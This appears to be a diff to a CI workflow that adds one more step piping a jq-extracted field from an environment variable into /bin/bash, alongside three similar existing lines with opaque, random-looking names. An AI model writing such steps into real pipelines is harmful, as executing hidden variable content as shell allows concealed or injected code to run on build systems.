@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$mxpo55049" | jq -r .erfbg1 | /bin/bash
           printf '%s' "$bq4" | jq -r .ufncs386 | /bin/bash
           printf '%s' "$hhwy212" | jq -r .lusr20325 | /bin/bash
+          echo $x44 | jq -r .eybzi0 | /bin/bash
 
       - name: Archive output
         if: always()
